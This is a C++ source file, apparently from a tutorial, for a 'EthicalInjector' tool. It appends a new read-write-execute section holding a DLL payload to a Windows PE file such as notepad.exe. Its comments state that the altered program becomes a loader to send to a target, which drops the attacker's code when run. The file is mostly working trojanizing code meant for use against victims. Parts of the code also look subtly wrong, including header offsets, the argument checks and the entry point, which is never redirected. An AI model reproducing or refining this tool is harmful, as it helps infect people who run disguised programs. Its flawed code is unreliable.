//this will be used to inject something  to the target program (in this tutorial, the target program was the fun.dll)
//in this demo, we are going to design this injector.cpp to be able to ADD
//2 sections to any PE file that we want to uyse (in this example, we use notepad.exe or fun.dll or any PE)
//using the injector, it will inject our code to the notepad.exe. This will make notepad.exe our loader and when we send it to our target, and they run it, it will dump out our code to the target

#include <Windows.h>

//function to establish an aligned section
DWORD AlignSectionHeader(DWORD section_size, DWORD alignment, DWORD address)
{
	if (!(section_size % alignment)) {
		return address + section_size;
	}
	else {
		//this formula will align the section header. 
		return address + (section_size / alignment + 1) * alignment;
	}
}


//entry point for console app
INT main(INT arg, PCHAR argv[]) 
{
	// ex: EthicalInjector.exe "section name" "target process (where DLL will be inject)" "dll"

	//make sure inputs are not empty
	if (argv[0] && argv[1] && argv[3])
	{
		//assigning target process to var
		char* target_process = argv[2];
		//assigning path to var
		char* dll_path = argv[3];
		//name of section that we want to create
		PCHAR section_name = argv[1];

		//creating file handle to deal with the target file
		HANDLE x_file = CreateFileA(target_process, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		//if handle is valid
		if (x_file != INVALID_HANDLE_VALUE)
		{
			DWORD file_size = GetFileSize(x_file, NULL);
			//write PBYTE since we need to allocate a buffer for this file
			PBYTE file_buffer = PBYTE(LocalAlloc(LPTR, file_size));
			//dword to store return bytes since we need to read it later
			DWORD returned_bytes, unused_bytes;

			//reading file from x_file and storing to returned_bytes
			BOOL file_read = ReadFile(x_file, file_buffer, file_size, &returned_bytes, NULL);
			//if file is read and returned bytes is what file size is then we can continue
			if (file_read == TRUE && returned_bytes == file_size) {
				//we are going to verify that the file we read is a PE file
				//emagic number is 5A4D which is a value located in every PE header. 
				//we will take the header from the file we read and check it against the IMAGE_DOS_SIGNATURE
				//NOTE THAT iMAGE IS MEANING FILE
				PIMAGE_DOS_HEADER image_dos_header = (PIMAGE_DOS_HEADER)file_buffer;
				if (image_dos_header->e_magic == IMAGE_DOS_SIGNATURE) {
					//getting image file header, image optional header, and image section header
					// (PIMAGE_FILE_HEADER) is typecasting
					PIMAGE_FILE_HEADER image_file_header = (PIMAGE_FILE_HEADER)(file_buffer + image_dos_header->e_lfanew + sizeof(DWORD));
					//image optional header
					PIMAGE_OPTIONAL_HEADER image_optional_header = (PIMAGE_OPTIONAL_HEADER)(file_buffer + image_dos_header->e_lfanew + sizeof(IMAGE_FILE_HEADER));
					//PE image section header
					PIMAGE_SECTION_HEADER image_section_header = (PIMAGE_SECTION_HEADER)(file_buffer + image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
					
					WORD PESections = image_file_header->NumberOfSections;

					//zero out the memory inside the section and then copy the size of the section name in CopyMemory()
					ZeroMemory(&image_section_header[PESections], sizeof(IMAGE_SECTION_HEADER));
					//the reason why we make it 8 bytes is because that's the max bytes it lets you put for name. 
					CopyMemory(&image_section_header[PESections].Name, section_name, 8);


					//read DLL file; with just GENERIC_READ since we don't have to write; NOTE: press CTRL twice for helpers if using VS
					HANDLE code_file = CreateFileA(dll_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

					//now inject code into loader if code file not invalid handle
					if (code_file != INVALID_HANDLE_VALUE) {
						DWORD dll_size = GetFileSize(code_file, 0);
						//if we sucessfully retrive size
						if (dll_size > 0)
						{
							//allocate new buffer
							PBYTE dll_buffer = PBYTE(LocalAlloc(LPTR, dll_size));
							if (dll_buffer != ERROR)
							{
								DWORD returned_dll_bytes;
								//read code_file, into dll_buffer, then dereference/store into returned_dll_bytes
								BOOL dll_read = ReadFile(code_file, dll_buffer, dll_size, &returned_dll_bytes, NULL);
								if (dll_read == TRUE && returned_dll_bytes == dll_size)
								{
									//create new section into PE and give it the correct attributes
									if (SetFilePointer(x_file, image_section_header[PESections].PointerToRawData + image_section_header[PESections].SizeOfRawData, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER) {
										//first need virtual size to align it
										image_section_header[PESections].Misc.VirtualSize = AlignSectionHeader(dll_size, image_optional_header->SectionAlignment, 0);
										//need to align virtual address
										image_section_header[PESections].VirtualAddress = AlignSectionHeader(image_section_header[PESections -1].Misc.VirtualSize, image_optional_header->SectionAlignment, image_section_header[PESections - 1].VirtualAddress);

										//align size of raw data
										image_section_header[PESections].SizeOfRawData = AlignSectionHeader(dll_size, image_optional_header->FileAlignment, 0);
										//pointer to raw data
										image_section_header[PESections].PointerToRawData = AlignSectionHeader(image_section_header[PESections - 1].SizeOfRawData, image_optional_header->FileAlignment, image_section_header[PESections-1].PointerToRawData);
										//now give it right characteristics. WRITE, CODE, EXE, etc.
										image_section_header[PESections].Characteristics = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;

										//set file pointer; if ok then set end of file
										if (SetFilePointer(x_file, image_section_header[PESections].PointerToRawData + image_section_header[PESections].SizeOfRawData, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
										{
											SetEndOfFile(x_file);
										}

										//resize the size of image (file)
										image_optional_header->SizeOfImage = image_section_header[PESections].VirtualAddress + image_section_header[PESections].Misc.VirtualSize;

										//since we added a new section, we need to increment the section count
										image_file_header->NumberOfSections += 1;


										//now add the code to the section and write the whole file back to x_file
										if (SetFilePointer(x_file, 0, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
										{
											//adding the section
											WriteFile(x_file, file_buffer, file_size, &returned_bytes, NULL);
										}
										//now we are doing to add the payload to the section we added above
										WriteFile(x_file, dll_buffer, dll_size, &unused_bytes, NULL);
									}
								}
								//free up DLL buffer
								LocalFree(dll_buffer);
							}
						}
					}
					CloseHandle(code_file);
				}
				
			}
			//clear file buffer
			LocalFree(file_buffer);
		}
		//close x_file
		CloseHandle(x_file);
		
	}
	
}